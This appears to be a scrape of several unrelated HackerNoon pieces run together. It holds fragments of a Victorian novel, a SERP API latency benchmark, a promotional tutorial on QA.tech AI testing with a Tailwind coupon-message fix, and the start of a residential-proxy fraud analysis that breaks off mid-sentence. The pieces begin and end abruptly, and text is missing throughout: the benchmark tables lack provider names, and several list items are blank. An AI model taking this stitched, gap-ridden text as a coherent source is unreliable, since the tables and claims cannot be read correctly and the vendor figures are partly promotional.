sing—old laments and hymns and dirges that made the girl’s heart sorrowful within her and caused Malcolm, who, having been out with the laird, returned at this juncture, to declare Allan had mistaken his vocation, for he was only fit for one of three callings, to wit, a parson, a parish clerk, or an undertaker.</p><p>:::info\n<em>About&nbsp;HackerNoon Book Series: We bring you the most important technical, scientific, and insightful public domain books.</em></p>",

This will help you quickly identify the best option for production workloads!</p><p>Before diving into the SERP benchmarks for AI agents and deep-research workflows, it’s better to first explain how we selected these SERP APIs and what exactly we tested.</p><h3>SERP API Selection Methodology</h3><p>These are the criteria used to select the SERP APIs for benchmarking:</p><ul><li>: Ability to query results from specific countries, regions, or cities.</li><li>: Support for retrieving search results in multiple languages.</li><li>: Possibility to switch between mobile and desktop SERP results.</li><li>: Flexibility to fetch multiple result pages.</li><li>: Support for mechanisms to manage failed requests, retries, and general debugging.</li><li>: Availability of official libraries that simplify SERP API integration and reduce development overhead.</li><li>: Compatibility with the&nbsp;&nbsp;to enable AI agents to call the SERP API directly.</li><li>: Support for tools, platforms, libraries, and frameworks used for building AI agents, LLM workflows, and AI pipelines.</li></ul><h3>SERP APIs Under Benchmark</h3><p>Applying the criteria presented earlier, these are the SERP APIs chosen for benchmarking:</p><p>|  |  |  |  |  |  |  |  |\n|----|----|----|----|----|----|----|----|\n|  | City-level geolocation with routing across 195 countries via proxies for optimal performance | All languages supported by Google | Desktop, mobile, tablet (with support for both iOS and Android mobile and tablet simulation | , or thousands via parallel requests + Pagination options | Custom error codes + Dedicated debug mode | ✅ | Make, n8n, Zapier, Vertex AI, AWS Bedrock, Dify, LangChain, LlamaIndex, CrewAI, and 50+ others |\n|  | City-level geolocation | All languages supported by Google | Desktop, mobile, tablet | Up to 10 results with a single API call + Pagination arguments | Basic custom error codes | ✅ | LangChain |\n|  | City-level geolocation | All languages supported by Google | Desktop, mobile, tablet | Up to 100 results with a single API call | Basic custom error codes | ❌ | n8n, Zapier, Make, LangChain, LlamaIndex |\n|  | City-level geolocation | All languages supported by Google | Desktop, mobile | Up to 100 results with a single API call + Pagination arguments | Basic custom error codes | ❌ | n8n |\n|  | City-level geolocation | All languages supported by Google | Desktop, mobile | Up to 10 results with a single API call + Pagination arguments | Basic custom error codes | ➖ (unofficial) | Haystack, JenAI, CrewAI, LangChain |\n|  | City-level geolocation | All languages supported by Google | Desktop, mobile, tablet | Up to 100 results with a single API call + Pagination arguments | Basic custom error codes | ➖ (unofficial, with the official coming soon) | n8n, Dify, LibreChat, Composio, AnythingLLM, LangChain, CrewAI, and others |\n|  | Country-level geolocation | All languages supported by Google | Desktop, mobile | Up to 100 results with a single API call, or 10 requests in parallel | Custom error codes + Dedicated API for debugging | ✅ | n8n, Zapier, Make, LangChain |\n|  | City-level geolocation, with support for coordinates | All languages supported by Google | Desktop, mobile | Up to 100 results with a single API call + Pagination arguments | Basic custom error codes | ➖ (only via Pipedream) | ❌ |\n|  | Country-level geolocation, with proxies in 13 countries | All languages supported by Google | Desktop, mobile | Up to 10 results with a single API call + Pagination arguments | Basic custom error codes | ➖ (only via Pipedream) | Via public OpenAPI specs |</p><p>To plug SERP data into AI agents or run scraping pipelines at scale, you need an API that is both fast and reliable. A SERP API is only production-ready if it can consistently&nbsp;<strong>deliver low latency and a high success rate</strong>, even under heavy workloads.</p><p>That is why we focused on the following benchmarks:</p><ul><li><p>: The latency time such that 95% of requests are faster than this threshold (and only 5% of requests are slower).</p></li><li><p>: Represents the median response time, showing how fast a typical request completes under normal circumstances.</p></li><li><p>: The average percentage of successful requests measured across thousands of calls over 30 days of usage.</p></li></ul><p>: To keep the comparison fair, we tested only&nbsp;<strong>Google SERP API performance</strong>. This ensures all providers are evaluated against the same data source. Some SERP APIs support multiple search engines (e.g, Bright Data, SerpApi, ScrapingDog, Zenserp, and others), but including them would introduce unnecessary variability into the results.</p><p>SERP API latency measures the time it takes for a search request to return results. Below, you’ll find benchmarks comparing latency across the selected SERP APIs.</p><h3>P50: Average SERP latency</h3><p>P50 is the 50th-percentile SERP latency, meaning half of all requests are faster, and half are slower. In simpler terms, it represents the typical or median response time. This information is important because it shows real-world performance under regular conditions.</p><p>|  |  |\n|----|----|\n|  | 2.61s (0.89s*) |\n|  | 2.53s (0.93s*) |\n|  | 2.58s |\n|  | 2.48s |\n|  | 2.23s |\n|  | 2.71s |\n|  | 4.54s |\n|  | 3.92s |\n|  | 2.64s |</p><ul><li>Routing via dedicated premium infrastructure</li></ul><p>Note that most SERP API providers fall within an&nbsp;<strong>average latency of around 2.5 seconds</strong>, while DataForSEO and Zenserp can reach or exceed 4 seconds.</p><p>Both Bright Data and SerpApi also offer&nbsp;<strong>options for routing through premium infrastructure</strong>, enabling enterprise-ready performance. In particular, Bright Data provides two options:</p><p>With an average recorded SERP latency of ~0.89 seconds,&nbsp;<strong>Bright Data stands out as the fastest SERP API in this category</strong>.</p><h3>P95: Worst-Case SERP latency</h3><p>P95 is the 95th-percentile latency, meaning 95% of requests are faster than this time and only 5% are slower.

      "content": "<p>When new features are rolled out, testing remains the biggest bottleneck.</p><p>\\n Typically, the workflow goes something like this: build a feature, create a PR, push to CI, skim through some screenshots, and hope nothing breaks in production when the user hits.</p><p>\\n Now, don’t get me wrong, shipping new features quickly is great, but manual testing simply can’t keep up. And even though the tools for testing do exist, they are not integrated with the rest of your workflow. This is probably why teams either skip tests or ship without doing them properly.</p><p>\\n Which brings me to another point: we plan in one tool, build in another, review somewhere else, and deploy in yet another. Then we try to patch it all up with multiple screenshots, team meetings, and tons of messages.</p><p>\\n Luckily, there is a way. Linear, Cursor, Vercel, and QA.tech make up a stack of tools that work together, handle each task automatically, and let you stay focused on building. Together, they replace manual testing workflows with AI testing automation that runs on every PR. In this article, I’ll walk you through building a demo checkout flow app using these tools. You’ll see how they work together and how they help you ship faster without breaking things. Let’s get started.</p><h2>Building a Checkout Flow That Actually Works</h2><p>To demonstrate this workflow, we’ll build a 4-step checkout flow:</p><ul></ul><p>You might be wondering why we are only focusing on the checkout flow. The answer is simple: it’s a core business process that comes with multiple edge cases like empty carts, payment cancellation, expired sessions, etc. If anything breaks here, you lose your revenue.</p><p>Here’s the stack we’ll use:</p><ul><li><a href=\"https://linear.app/\">Linear</a> for clear and trackable work</li><li><a href=\"https://hackernoon.com/ai-coding-tip-003-force-read-only-planning\">Cursor</a> for building at lightning speed</li><li><a href=\"https://vercel.com/\">Vercel</a> for instant preview deploys</li><li> for an end-to-end (E2E) testing</li></ul><p>Let’s start with the planning tool.</p><h2>Plan It in Linear, Build It in Cursor</h2><p>I’ll break down the checkout flow app into simple and trackable tasks.</p><p>The main focus of this article will be on adding the Coupon Codes functionality to the Cart Review stage of your checkout process.</p><p>First, let’s create a Linear ticket. It can be something like “Feature: Build checkout flow with coupon validation.” Then, we can divide it into small subtasks according to our requirements.</p><p>\\\nFor the sake of this demo, we’ll introduce a bug in the Coupon Code feature's client-side validation. And to spice it up, it won’t be a glaring bug. It will be a tricky one that only surfaces under certain conditions. In other words, the one that slips past human reviews and scripted tests.</p><h3>Building Fast with Cursor</h3><p>The complete code for our demo app is in the GitHub <a href=\"https://github.com/literallydotdev/checkout-flow\">repository</a>.</p><p>When you open Cursor, create a new directory to start building the app. Then, let AI do its magic.</p><p>Let’s say you want to create a cart component in the 4-step checkout flow app. You could give Cursor a prompt like: “Build a cart component for my app to list items with prices and quantities.”</p><p>Notice how Cursor handles the component structure, prop types, installing and importing packages, and much more? Your job now is to focus on business logic, like “How much discount should be applied when  coupon is used?”</p><p>Let’s move forward to the deployment phase using Vercel.</p><h2>Deploy to Vercel in Seconds</h2><p>Deployment nowadays is as easy as building with Cursor. You don’t write commands to ship your code. It's like a dashboard click: select your GitHub repository, and give it to Vercel for deployment.</p><p>\\\nOnce the code is done, we just push it to GitHub. That’s all it takes; from there, Vercel handles everything for deployment automatically.</p><p>But why Vercel? Simply because it lets you preview deployments before your code gets messed up in production.</p><h3>Why Preview Deployments Matter for CI/CD?</h3><p>Preview deployments change how we work. With tools like Vercel’s DX, every PR gets its own URL, like <code>checkout-app-pr-987.vercel.app</code>, along with a fully-functional and evergreen environment.</p><p>When the developer pushes the code that implements our new checkout process, as well as the hidden coupon bug, here’s what automatically happens via Vercel:</p><ul><li>The latest code is retrieved from GitHub;</li><li>The application itself is built;</li><li>The app is deployed to a unique preview URL that is shareable (e.g., <code>checkout-app-pr-987.vercel.app</code>).</li></ul><p>This individual deployment ensures speed. Bugs are fixed without interfering with or slowing down any other projects. No more “works on my machine.” No more rolling the dice on staging.</p><p>The checkout application is now live and available for testing.</p><h2><strong>Let QA.tech Handle the Tests</strong></h2><p>Here comes the interesting part: AI-powered automated testing.</p><p><a href=\"https://qa.tech/\">QA.tech</a> is an AI testing tool that replaces manual QA with AI agents that navigate your app. Instead of spending hours testing your tool&nbsp;manually or&nbsp;writing&nbsp;and&nbsp;maintaining&nbsp;Playwright or&nbsp;Cypress scripts, you describe test cases in plain English&nbsp;and the agent handles the rest. It scans your app, builds a knowledge graph of your UI, and auto-generates E2E tests that update themselves when your app changes.</p><p>Add your project to QA.tech and point it at your Vercel-deployed URL. QA.tech will then scan your web app and learn the structure by building a knowledge graph.</p><p>We’ll create some tests for our application. Open the chat and describe what you want to test. For instance, “Create 3-4 initial tests for my app.”</p><p>From there, QA.tech will generate the test steps automatically. Remember, it already knows everything about your app, like where the cart is, how to fill shipping forms, where the payment button lives, and the confirmation page.</p><p>We’ll add another test for validating the coupon code confirmation on mobile screens. You can create this test case manually through the “Add test case” button or generate it in the chat, by prompting something like, “Test the coupon code confirmation message for mobile screens on step 3.”</p><p>\\\nQA.tech will auto-generate the tests based on your input and run them directly against your live app.</p><p>\\\nThe bug that was left by Cursor while building the application was caught by QA.tech, causing the test to fail.</p><p><a href=\"https://QA.tech\">QA.tech</a> also provided us with all the relevant steps, along with the logs, network details, and test results. These are exactly the insights we need to debug the issue efficiently. Before we fix it, though, let’s connect the tools so they work together.</p><p>First, connect the <a href=\"https://docs.qa.tech/configuration/github-app\">GitHub App</a> with your project repository. Go to Settings → Integrations → GitHub App. Select the relevant repository here, and allow the “Run on PRs” option from the Pull Request Testing.</p><p>Next, connect Linear, so our bugs can flow directly into our project management tool.</p><p>To do this, Go to Settings → Organization Connections → Connect Linear.</p><p>Then, from the Project Settings → Integrations → Linear, select your team from the dropdown, and save it.</p><p>\\\nWe’ll now create issue tickets in Linear directly from QA.tech. Notice how QA.tech has already listed our failed test case under the issues section, giving you an option to export this bug directly to your Linear account?</p><p>Simply click \"Create issue in Linear\" on the dashboard.</p><p>Your Linear dashboard will now show the issue created by <a href=\"https://QA.tech\">QA.tech</a> with details such as type, first seen, description, and a link to the test.</p><p>Now comes the automated part. We’ll fix this bug and watch how the tools work together.</p><h2>Fix, Push, Repeat (The Actual Workflow)</h2><p>Back to Cursor. We’ll fix the issue by identifying where the bug occurred.</p><p>In , the issue was that we were using  in the confirmation message class, causing it not to show on mobile screens.</p><pre><code>&lt;div className=\"bg-indigo-50/60 p-4 rounded-2xl border border-indigo-200 border-dashed\"&gt;\n  &lt;p className=\"text-sm font-semibold text-indigo-700\"&gt;Have a coupon?&lt;/p&gt;\n  &lt;div className=\"sm:flex-row flex flex-col gap-3 mt-3\"&gt;\n    &lt;input\n      type=\"text\"\n      value={couponInput}\n      onChange={(event) =&gt; onCouponInputChange(event.target.value)}\n      placeholder=\"SAVE10\"\n      className=\"text-slate-900 focus:border-indigo-500 focus:outline-none focus:ring-2 focus:ring-indigo-100 px-4 py-3 w-full text-base bg-white rounded-xl border border-indigo-200 shadow-inner\"\n    /&gt;\n    &lt;button\n      type=\"button\"\n      onClick={onApplyCoupon}\n      className=\"hover:bg-indigo-500 px-6 py-3 text-base font-semibold text-white bg-indigo-600 rounded-xl transition\"\n    &gt;\n      Apply\n    &lt;/button&gt;\n  &lt;/div&gt;\n  {couponStatus === \"applied\" &amp;&amp; (\n    &lt;p className=\"sm:block pt-3 text-sm font-medium text-emerald-600\"&gt;\n      SAVE10 applied — enjoying 10% off the subtotal.\n    &lt;/p&gt;\n  )}\n  {couponStatus === \"invalid\" &amp;&amp; (\n    &lt;p className=\"sm:block hidden pt-3 text-sm font-medium text-rose-600\"&gt;\n      That code is not active. Try SAVE10 for this order.\n    &lt;/p&gt;\n  )}\n&lt;/div&gt;\n</code></pre><p>Once that’s done, push the latest changes and create a PR with a new branch. Vercel will then deploy a preview URL automatically.</p><p>Now, QA.tech’s GitHub App detects the PR. It analyzes your changes and selects the relevant tests, like the coupon validation tests we created earlier.</p><p>\\\nIt runs those tests against the Vercel preview URL: no manual intervention, no clicking through the app yourself. QA.tech’s bot will run the tests and comment in the PR to give the user real-time updates.</p><p>In our QA.tech dashboard, all tests have passed, and the validation message now appears correctly on mobile.</p><p>The QA.tech bot approves the PR and comments on your PR with the complete test summary.</p><p>\\\nThe complete process (updating the code, merging, deploying, and testing) took about 5-8 minutes without manual intervention.</p><p>Every future pull request (PR) will follow the same process: make changes, push, and let the tests run automatically. Bugs will get caught before merge, and the whole automated cycle will let the teams ship faster.</p><p>Each tool in this new AI builder excels at one thing. Linear provides the focus needed for rapid planning and issue tracking, Cursor accelerates the product development workflow, Vercel gives us instant deployment preview URLs, and QA.tech handles testing automatically. Together, they create a workflow that lets teams ship faster without compromising on quality.</p><p>Despite the importance of each step in the process, testing is often the one thing that teams spend the least time on. However, this article has showed that you don’t need a bigger team; you only need smarter tools that work well together.</p><p>And the best part is that you don’t have to maintain test scripts. Add a feature, and QA.tech will create new tests. Change a UI flow, and tests will update automatically. You just focus on building, and let AI handle the testing.</p><p>:::tip\nReady to stop writing, maintaining, and debugging brittle E2E tests? <a href=\"https://qa.tech/demo\">Get a demo</a> today and see how QA.tech transforms your testing workflow.</p>",

No; John Merapie found he was a far more sensible agreeable kind of fellow to work with than many a rich business&nbsp;&nbsp;with whom he had occasionally dined, and altogether the Lincolnshire squire and the London quarter-millionaire ran so admirably together along that difficult and dangerous road called daily communication, that Mr. Alfred Westwood grew at length seriously uneasy, and finally felt quite as if an incubus was removed from his spirit when he heard Mr. Ivraine had at last fairly taken his departure, after receiving a cordial invitation from his late host to pay him a visit whenever he was “within twenty miles of Belerma Square.”</p><p>But notwithstanding his long absence and his good feeling towards his new acquaintance, Malcolm and Mina both noticed that the cloud which had rested on their uncle’s brow ere his departure for Holland, had returned thence with him, and a gloom seemed to hang over the entire household from the moment of his re-appearance, the mystery of which no member of the establishment, and no person, perhaps, in the circle of his acquaintances, save Mr. Alfred Westwood, was able to fathom.</p><p>That clever individual, however, having opened “by mistake” a letter for Mr. Merapie, which he&nbsp;293knew was not on business, during his principal’s absence in Holland, had arrived, after its perusal, at the knowledge of a great secret; which knowledge put him in a position to triumph a little over Malcolm and Mina Frazer, and to feel that, to a certain extent, the whole family, from Mr. Merapie down to his refractory niece, was, after a fashion, in his “power.”</p><p>“I have often wished,” he said, after taking a copy of the epistle above referred to, “I have often wished to possess some ‘hold’ over them all, and that girl in particular; I have got one now, a capital lever, if only properly employed, and, please the fates, I’ll use it.”</p><p>And having arrived at this Christian determination, Mr. Westwood sallied forth and hunted over half the city shops to get an oblong seal with the announcement “I wait” cut thereon; and when, after great difficulty, he had succeeded in obtaining it, and a stick of pale blue wax, he returned to the office and closed up the missive again, which, by the way, was directed in a female hand, and marked “private.” And, as he chanced to be writing that very afternoon to Mr. Merapie, he forwarded the letter to him and sauntered thenceforth about his partner’s house in Belerma Square as if, to repeat&nbsp;294Malcolm’s impatient expression, “it belonged to him.”</p><p>And though, during the course of the following month, he was too much occupied through the week with business, and too constantly engaged on Sundays watching Mina and Mr. Ivraine, to pursue his investigations as far as he desired, yet he never for one moment forgot what he had discovered, and what he wished further to discover; so, when in due course Mr. Merapie’s return and Ernest’s departure set him once again, as it were, at liberty, he hastened to make himself master of the whole subject by actual observation and personal investigation on the spot.</p><p>It was some five miles from London, under the spreading branches of an ancient walnut tree, standing leafless and bare, close to the entrance of one of those villas we see so perpetually advertised under the appellation of “genteel residences,” that knowledge, full and complete, reached the mind of Alfred Westwood; more full and complete truly than he had ever desired should dawn upon his startled comprehension: for, as he sauntered past the place in the chill cold light of a February afternoon, a phaeton, containing two persons, a lady and a boy, drove up to the gate; there was a momentary pause, whilst a&nbsp;295person, who chanced to be coming out at the instant, opened it, and the glance which that pause enabled Mr. Westwood to catch of the lady’s face caused him to turn as pale as a corpse and tremble for a second like a woman.</p><p>He had barely time to pull his hat almost involuntarily over his eyes ere the vehicle and its occupants were gone. They had come, passed him, and departed like a dream of the morning; but Alfred Westwood knew it was no dream. “I wish to heavens it were,” he muttered, with clenched teeth and livid lips, as he strode after the female who had admitted the pair, and whom he recollected perfectly, as he recollected every thing and place and person on whom, with his extremely far-seeing, disagreeably searching eyes, he had once looked.</p><p>“Mrs. Colefort,” he said, and the words, though spoken in a low tone, made her to whom they were addressed start as if a pistol had gone off at her ear. “Do you not remember me?” he added, finding she only stared in his face by way of reply to his abrupt salutation.</p><p>“Yes, sir,” she stammered, “but——”</p><p>“But you do not wish to remember,” he interrupted, his wonted self-possession having by this time completely returned to him: “well so be it;&nbsp;296only one question fairly answered, and I am satisfied; who is that?”</p><p>“Who is what?” demanded the old woman, a gleam of her ancient cunning sharpening her wrinkled features.</p><p>“Pshaw!” returned Mr. Westwood; “who is the lady you admitted this instant into that villa place?”</p><p>“My mistress,” was the brief reply.</p><p>“And her&nbsp;&nbsp;name,” he persisted; “recollect I am willing to pay for accurate information.”</p><p>“What will you give to know?” asked the woman.</p><p>“Five pounds,” replied the man who once had been a bankrupt.</p><p>“Five pence,” she contemptuously retorted; “it’s worth fifty guineas.”</p><p>“Five pounds or nothing,” said Westwood determinedly.</p><p>“Make it ten, and I’ll tell you,” she returned.</p><p>“If you won’t speak for five, you may hold your tongue,” was the response; “so take your choice, for I ask you for the last time, who is she?”</p><p>A purse glittering with steel beads was in Mr. Westwood’s hand as he uttered the foregoing sentence; and when, at its conclusion, he held forth&nbsp;297five sovereigns and added the single word “Now,” the woman felt herself impotent to withstand the bribe, small though she considered it, and therefore cautiously answered, after stealing a look behind her,</p><p>“The devil!” ejaculated Mr. Westwood, and he ground out a few oaths between his teeth, whilst Mrs. Colefort, with a sinister laugh, echoed,</p><p>“Yes, she is pretty nearly one; so John Merapie found, to his sorrow, before she had borne his name long.”</p><p>“And what name did she bear before that?” demanded Mr. Westwood fiercely.</p><p>“Her own, I suppose,—Margaret Maxwell.”</p><p>If the light had been a little clearer and her own eyes undimmed by the mist of age, the woman might have noticed that a sort of throe seemed to convulse Mr. Westwood’s frame as her answer grated on his ear. He winced under the sound of that name as if it had touched some concealed wound: the truth which the quondam housekeeper framed into such unconsciously telling words, appeared to blast him, as if a wind from some barren desert had passed over and scorched his soul.</p><p>Long after he had left the woman, long after he&nbsp;298had returned to London, days after the brief interview in which he had learnt all he wished to know and a great deal more besides; in the busy ’Change, in his quiet house, everywhere, Alfred Westwood found himself inwardly repeating, over and over again, one single sentence—</p><p>“Margaret Maxwell—Mrs. Merapie.”</p><p>And this sentence never grew old or familiar to his ear; he harped on it eternally, and yet still its meaning always came with a sort of shock upon his understanding.</p><p>“Margaret Maxwell—Mrs. Merapie.”</p><p>If a spell had been contained in this simple combination of letters, it could scarcely have produced a greater effect on the&nbsp;&nbsp;clerk, who became for a time quite taciturn and reserved, who ceased to domineer over Malcolm or torment Mina, and never once strove to dissuade Mr. Merapie from permitting both the young people to go to the Highlands and enjoy themselves.</p><p>“What under the sun has come over Westwood?” demanded Malcolm of his sister, the evening before they started on their self-imposed pilgrimage northwards.</p><p>“He is growing old, dear,” answered Mina, who could afford to laugh at her uncle’s partner now she&nbsp;299was in a good temper and going to leave him behind her; but neither her brother nor Miss Caldera, who was present, thought her suggestion a rational one, and the former, for once, felt almost inclined to agree with the governess, when she told Mina a little tartly, that she was a very absurd girl, and that she surely might have had sense enough to see that something must be decidedly going wrong at the office, when both her uncle and his partner were so grave.</p><p>“Heaven send they may weather the storm,” added Malcolm devoutly; “but, if there be any judging from faces, business clouds must be of the blackest down at Wapping; however, Uncle John is a first-rate craft, and the wind cannot always blow a-head; so, when I return from Craigmaver, I shall hope to find him in a friendly port, and consequently able and inclined to do what I want him to do—buy me a commission.”</p><p>“You ought to be made to work for one,” remarked Miss Caldera.</p><p>“All in good time, dear lady,” answered Malcolm, laughing; “I make no doubt I shall have to be very industrious, a human sort of busy bee at some future period or other.”</p><p>“It will be greatly against your inclination,&nbsp;300then,” retorted the governess: but, spite of the utterance of this truism, Malcolm and she parted remarkably good friends; and Mina, with a little tremor in her voice, promised, as she kissed the dear, quaint, steady friend, not to forget her, and to bring her back a cairngorm brooch from Scotland.</p><p>“Bring yourself, you wayward creature,” answered Miss Caldera, “and don’t leave your heart behind you.”</p><p>“Oh, no! I shall keep it safe for—Mr. Westwood,” were the girl’s last words ere, in a perfect ecstasy of delight, she bent her longing eager eyes northwards; for, steadily as the needle points to the pole, Mina’s thoughts and hopes and expectations turned ever unceasingly towards the land of her birth: to revisit it, to hear again well-remembered voices, to speak once more to those she loved, to wander as of yore over the hills, to see the grand old mountains piled against the clear blue heavens, had been the dream of her life, the wish of her soul for years: and now it was no longer to be a dream, an ungratified wish,—it would soon be a reality.</p><p>“I am so glad,” she said to Malcolm, “that I could cry.” And Mina did cry with joy to see the old familiar places once again, just as she had, in&nbsp;301former times, wept in bitter anguish because compelled to leave them all behind her.</p><p>It was a lovely evening in the early spring when, after that long dreary separation and fatiguing journey, Mina caught at length a distant view of beautiful Craigmaver. The departing sun flung a warm rich tint over mountain and valley, over the peaceful lake, the silent firs, and the graceful birch trees that were just donning their first faint green attire. A feeling, such as she had not experienced for years, of youth and freshness and vigour and hope, swept across Mina’s heart as she leant forward and took in, at one earnest glance, every object in the landscape; but since the days when, a child by her father’s side, she had enjoyed that scene without a care or a thought of sorrow, a few corroding drops from the cup of experience had fallen on her spirit and saddened it; and thus, even in the midst of her joy, a memory of pain brought tears to her eyes and blinded them.</p><p>“Nothing is changed,” remarked Malcolm, as they drove along, “excepting that the trees have grown.”</p><p>Mina made no answer. Nothing except the trees, indeed, had changed, she knew, since last she had looked upon that place; but, since the old times,&nbsp;302when they had been wont to visit the laird, her father had passed from earth for ever, and Glenfiord was not theirs now; and the girl called another country, home; and the inheritance that was to have been Malcolm’s had been purchased by strangers; and in the house and gardens and pleasure grounds, which her dead parent had owned and improved and prided himself on, she or hers had no right to set foot, unless by courtesy or sufferance. As a dark thread mingles ever in the web of human life, no matter of what gay, bright colours the rest of that web may be woven, so the sad thought of her lost home and of him who had dwelt there caused one or two tears of sorrow to fall with the many happy ones that came streaming from the girl’s dark eyes, as she and Malcolm drew nearer, still nearer, to the lonely lovely nook amid Highland mountains, where the head of the Frazer clan, the best, the truest, the worthiest descendant of a proud old race, dwelt peacefully.</p><p>“Look up, Mina,” cried her brother, “there they are on the lawn watching for us.” And, as he spoke, the old laird advanced to meet the vehicle.</p><p>There was a wild throbbing at her heart: as she sprang out, a mist fell upon every object within her range of vision; but still Mina, hanging on her&nbsp;303uncle’s neck, heard his almost inarticulate words of tender welcome sounding in her ear, and, for one brief moment, she felt, as she had once said to Miss Caldera she should feel, “that she had not a thought of care, a wish on earth ungratified.”</p><p>“Are you just the same as ever?” demanded the laird, holding her a little from him and gazing intently into her agitated face, wet with weeping, yet still bright with smiles, “are you just the same as ever?”</p><p>“Not a bit better, uncle,” she answered.</p><p>“If you are no worse, I humbly thank God,” said the old man, looking upwards; “but are you sure,” he added, as though in doubt, “are you quite sure you have brought the old honest heart you once possessed back to us again?”</p><p>“It has never been away from you,” she earnestly replied; “my body was in England, but my spirit always remained here; and you, uncle, you are not in the least altered, but Allan has become a man: dear me! how he has changed.” And Mina stood for a moment contemplating him whom she had left a boy, and whom she returned to find as handsome and stately a specimen of the Highland gentleman as ever crossed the moors, or brought down, with unerring aim, the wild bird, which finds a perfumed&nbsp;304home and a violent death amid the glowing purple heather.</p><p>“Yes, cousin mine,” responded Allan, “I am changed in many ways, and I have, alas! for me, become a man; but do not delude yourself into the belief that I am the only one time has touched, for I see you are “Little Mina” no longer, and the child of the mountains has become quite a young English lady; and Malcolm, I find, has managed to overtop me: we are all changed in appearance, two for the better, one for the worse, if you like to accept the vague compliment, cousin; I hope you will.”</p><p>“Is flattery an accomplishment you have learnt since we parted, Allan?” demanded Mina, suddenly, and the sharp question brought a glow on his cheek, even while he answered “No.”</p><p>“It is,” broke in the old laird; “he is more altered than you are, notwithstanding he has lived at Craigmaver, and you amongst the noisy London streets.”</p><p>“Send me to London in charge of my fair cousin then, sir, and see whether the din may not improve me,” was Allan’s response: but Mr. Frazer merely shook his head in reply, and led Mina off to the house, sighing as he did so.</p><p>Inside the mansion all remained just as his niece&nbsp;305had left it: the deer’s heads and the old swords and gauntlets and pieces of ancient armour hung in the hall in the same places she remembered they occupied when she was a very little girl; the furniture in the drawing-room, the tapestry in the bedchambers, the polished oaken floors, the carved armchairs, the family portraits, the view from the windows, all were so like what they had been that, as she wandered through the apartments, Mina felt as if everything, save herself, must have stood still during the years that had seemed in London so countless, but which then she imagined she could clasp at once in her hand—so dream-like did that portion of the past appear, so real and tangible was the present. The shore of childhood came, for the instant, so close to that bordering upon womanhood, that, for the moment, Mina fancied they actually touched, and forgot the broad wide gulf stretching between the two, over which she had, in the dreary interim, crossed. As the mariner, after months and months of weary voyaging, recollects not, when he again beholds the cliffs of his native land, the pains and perils of the sea, so the period she had spent in England became a sort of blank, for the time being, in Mina’s memory; she rejoiced so fervently to come back once more to find all as she had left it.</p><p>306All! the girl soon discovered there was a something different in the old place; what, she could not tell: it was not that they, the inhabitants of that Highland home, were altered in affection towards her; it was not that her love for them had suffered any diminution; it was not that less concord reigned in the domestic circle; that disunion prevailed; that arguments arose. Mina could not find out what the “something” might be; and, as it seemed to be independent of her and hers, to be merely a shadow from some distant cloud, which threw a sort of darkness into that once perfectly sunshiny house, she gave up, after the first day or two, speculating concerning it; thus the weeks sped joyously on, and a flush of greater health than had for years past been seen there, mantled on her formerly pallid cheek; while Malcolm and she built air castles innumerable; and time passed, oh! with what swift noiseless feet; life seeming a sort of fairy dream to Mina during those quiet hours when she walked and sat with her uncle, and strolled about the gardens, talking to Saunders and looking at his flowers; when she and her brother and cousin rode quietly over the moors; and when Allan, in the solemn twilight, touched the keys of an old pianoforte, and sung songs so plaintive and beautiful that the girl used to bow her&nbsp;307head on her hands and weep, she knew not why, to hear them.</p><p>For Allan Frazer had learned many an accomplishment besides flattery since the days when they last parted: he was skilled, not merely in field sports, but also in those other acquirements that make a man be deemed a welcome guest in the houses of the literary, the fashionable, the select. He could sketch with a firm, rapid, masterly hand the scenery of his native land; he could sing, in tones that stole somehow into the very innermost recesses of the heart, Scotch and Italian and Spanish airs; he was learned in many sciences, wrote works that publishers accepted, and poems ladies loved him for inditing; he had read and studied and thought; and when he went to Edinburgh, clever men sought him; and the most beautiful women of that metropolis would rather have danced with Allan Frazer than with many a lord or baronet, for he was the “fashion” there—Mina’s handsome, elegant, interesting cousin.</p><p>“How much you know, Allan,” she remarked to him one day, shortly after her arrival.</p><p>“I have paid a price for it,” he answered, with a strange smile.</p><p>Mina paused and looked doubtingly at him for a moment; then she said,</p><p>308“If I were not afraid of my words sounding tame, after the compliments uncle tells me you are accustomed to, I would say I never saw any one so improved in my life.”</p><p>“I have gained a good deal I could have done without, Mina,” he replied a little gravely, “and lost what I can ill spare.”</p><p>“Tell me what it is, Allan,” she pleaded, “perhaps it may keep me from envying you too much; tell me what it is.”</p><p>“Peace of mind,” he answered, with a sigh; and Mina, after gazing into his clouded face, feared that it really was so, though why it should be she found herself perfectly incompetent to tell.</p><p>:::info\n<em>About&nbsp;HackerNoon Book Series: We bring you the most important technical, scientific, and insightful public domain books.</em></p>",

      "content": "<p>\\\nWe analyzed 170+ million residential proxy IPs over a 90-day period (86M IPv4, 87M IPv6) and discovered two patterns that explain why fraud detection is so hard:</p><ol><li><strong>46% of residential proxy IPs appear across multiple provider networks simultaneously</strong>&nbsp;(70% for IPv4, 22% for IPv6). The same compromised infrastructure, infected routers, malware-laden devices, bandwidth-sharing apps, is accessible through different proxy services. An IP in Bright Data's network is often also available through Smartproxy, Oxylabs, and many other providers. Over longer time windows, IPv4 infrastructure shows even higher cross-provider overlap, with nearly 70% of IPv4 addresses appearing across multiple providers.</li><li><strong>60% of residential proxy IPs are only observed once in a 90-day window</strong>&nbsp;(32% for IPv4, 87% for IPv6). The same addresses don't persist, they rotate rapidly between active proxy use and legitimate residential traffic, cycling out faster than reputation systems can track them. IPv6 addresses show extremely high churn with 87% observed only once, demonstrating their ephemeral nature. Even over a 90-day period, a majority of residential proxy IPs are seen only once, making it nearly impossible for traditional reputation systems to build meaningful abuse history.</li></ol><p>For fraud teams relying on traditional IP reputation data, abuse history, or risk scoring models, these two realities create a critical blind spot. The rapid rotation of IPs combined with shared infrastructure across providers means that blocking individual residential proxy service IPs or relying on historical abuse data is ineffective against residential proxy networks.</p><h2>Why Residential Proxies Break Traditional Detection</h2><p>Residential proxies are fundamentally different from datacenter proxies or VPNs. They route traffic through real consumer ISP connections: your neighbor's compromised router, a student's laptop running a bandwidth-sharing app, a smart TV infected with malware. These IPs look legitimate because they are legitimate addresses, just temporarily hijacked for proxy traffic.</p><p>The challenge isn't just detection: it's the rotation. Residential proxy IPs constantly cycle between three states:</p><ol><li>&nbsp;- Currently routing malicious traffic</li><li>&nbsp;- Temporarily removed from the proxy pool</li><li>&nbsp;- Back to serving the actual homeowner</li></ol><p>This rotation happens rapidly: sometimes hourly, sometimes daily. An IP routing credential stuffing attacks at 3pm might be streaming Netflix for a legitimate user by 6pm.</p><h2>The Rotation Problem: IPs Churn Faster Than Reputation Can Track</h2><p>Our January 2026 analysis of&nbsp;<strong>170 million residential proxy 